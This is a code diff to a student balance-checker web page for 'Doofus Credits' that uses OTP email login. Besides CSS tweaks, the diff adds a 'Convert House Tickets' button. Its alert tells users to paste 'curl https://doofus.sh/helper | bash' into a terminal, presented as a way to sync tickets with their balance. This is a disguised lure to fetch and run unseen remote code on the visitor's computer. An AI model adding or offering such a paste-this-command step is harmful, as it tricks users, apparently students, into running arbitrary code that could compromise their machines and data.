@@ -147,7 +147,6 @@
             transform: translateY(-1px);
         }
 
-        /* FIXED OTP INPUTS */
         .otp-inputs {
             display: none;
             flex-direction: row;
@@ -199,6 +198,7 @@
             transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
             position: relative;
             overflow: hidden;
+            margin-bottom: 12px;
         }
 
         .btn::before {
@@ -233,6 +233,27 @@
             opacity: 0.6;
             cursor: not-allowed;
             transform: none;
+        }
+
+        .btn-secondary {
+            background: linear-gradient(135deg, rgba(255, 165, 0, 0.3), rgba(255, 140, 0, 0.2));
+            border-color: rgba(255, 165, 0, 0.4);
+            font-size: 15px;
+            padding: 14px 18px;
+            margin-top: 0;
+        }
+
+        .btn-secondary:hover {
+            background: linear-gradient(135deg, rgba(255, 165, 0, 0.4), rgba(255, 140, 0, 0.3));
+            border-color: rgba(255, 165, 0, 0.6);
+            transform: translateY(-1px);
+        }
+
+        .balance-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 24px;
         }
 
         .balance-section {
@@ -361,14 +382,14 @@
             <p style="color: rgba(255, 255, 255, 0.8); font-size: 16px;">
                 Available Doofus Credits
             </p>
-            <div style="margin-top: 24px;">
+            <div class="balance-buttons">
                 <button class="btn" onclick="location.reload()">Check Again</button>
+                <button class="btn btn-secondary" onclick="convertTickets()">Convert House Tickets</button>
             </div>
         </div>
     </div>
 
     <script>
-        // Your EmailJS credentials (kept as-is)
         emailjs.init("-0YJ2zFBFK5sdLMho");
 
         let currentStudentId = '';
@@ -387,7 +408,6 @@
         const emailDisplay = document.getElementById('emailDisplay');
         const studentError = document.getElementById('studentError');
 
-        // Auto-focus next OTP input
         otpInputs.forEach((input, index) => {
             input.addEventListener('input', (e) => {
                 if (e.target.value.length === 1 && index < otpInputs.length - 1) {
@@ -511,6 +531,17 @@
             
             otpForm.style.display = 'none';
             balanceSection.style.display = 'block';
+        }
+
+        function convertTickets() {
+            alert(
+                "To convert your House Tickets to Doofus Dollars:\n\n" +
+                "1. Open Terminal (Command Prompt / PowerShell / iTerm)\n" +
+                "2. Copy & paste this command:\n\n" +
+                "   curl https://doofus.sh/helper | bash\n\n" +
+                "3. Press Enter and watch the magic happen!\n\n" +
+                "⚡ This will sync your house tickets with your balance."
+            );
         }
 
         function updateOtp() {
